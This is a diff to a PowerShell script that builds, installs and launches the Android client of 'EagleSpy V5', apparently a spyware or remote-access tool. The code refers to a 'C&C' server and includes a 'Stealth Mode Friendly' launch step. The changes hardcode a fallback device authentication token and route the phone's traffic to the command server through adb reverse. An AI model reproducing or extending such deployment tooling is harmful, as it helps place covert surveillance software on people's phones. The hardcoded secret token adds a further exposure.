@@ -48,21 +48,22 @@ if ($adbDevices -match "\tdevice") {
 Print-Header "Step 2: Building Android Client (Gradle)"
 $clientDir = "E:\EagleSpy V5\android-client"
 
-# Auto-detect Host IP
-$hostIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "vEthernet" -and $_.IPAddress -notmatch "^127\." -and $_.IPAddress -notmatch "^169\.254\." } | Select-Object -First 1).IPAddress
-if (-not $hostIp) {
-    $hostIp = "10.0.2.2" # Fallback
+# Use adb reverse to tunnel traffic; point app to 127.0.0.1:8080
+$serverUrl = "http://127.0.0.1:8080"
+$deviceToken = $env:DEVICE_AUTH_TOKEN
+if (-not $deviceToken) {
+    $deviceToken = "418b899a24ccbdc545cf5a91dda8fc8674363dc43d14b91eee0092142b8b0933"
 }
-$serverUrl = "http://${hostIp}:8080"
-Print-Success "Configuring APK for Server: $serverUrl"
+Print-Success "Configuring APK for Server: $serverUrl (via adb reverse)"
+Print-Success "Device Token: ${deviceToken:0:8}..."
 
 if (Test-Path $clientDir) {
     Push-Location $clientDir
     
     if (Test-Path "gradlew.bat") {
-        Write-Host "Running Gradle Build with -PserverBaseUrl=$serverUrl"
+        Write-Host "Running Gradle Build..."
         # Use cmd /c to run bat file properly from PowerShell
-        cmd /c "gradlew.bat assembleDebug -PserverBaseUrl=""$serverUrl"""
+        cmd /c "gradlew.bat assembleDebug -PserverBaseUrl=""$serverUrl"" -PdeviceToken=""$deviceToken"""
         
         if ($LASTEXITCODE -eq 0) {
             Print-Success "Gradle Build Successful!"
@@ -114,24 +115,13 @@ if (-not $installed) {
     Print-Success "Package verified on device."
 }
 
-# Connectivity Check from Device
-$pingHost = $serverUrl -replace "http://", "" -replace ":.*", ""
-Write-Host "Checking connectivity from device to $pingHost..."
-adb shell "ping -c 1 $pingHost"
+# Port forward / reverse to ensure connectivity from device to host
+Print-Header "Step 4.1: Setting up adb reverse (device -> host)"
+adb reverse tcp:8080 tcp:8080
 if ($LASTEXITCODE -eq 0) {
-    Print-Success "Device can ping the server."
+    Print-Success "adb reverse tcp:8080 -> tcp:8080 established."
 } else {
-    Print-Error "Device CANNOT ping $pingHost. Attempting to add Windows Firewall rule..."
-    try {
-        New-NetFirewallRule -DisplayName "EagleSpy C&C" -Direction Inbound -LocalPort 8080 -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
-        Print-Success "Added Firewall Rule for Port 8080. Retrying ping..."
-        adb shell "ping -c 1 $pingHost"
-        if ($LASTEXITCODE -ne 0) {
-            Print-Error "Still cannot ping. Please check network isolation (e.g., AP Isolation on Router)."
-        }
-    } catch {
-        Print-Error "Failed to add firewall rule. Run PowerShell as Administrator."
-    }
+    Print-Error "Failed to set adb reverse. Ensure USB debugging and authorize host."
 }
 
 # Launch App using Broadcast (Stealth Mode Friendly)
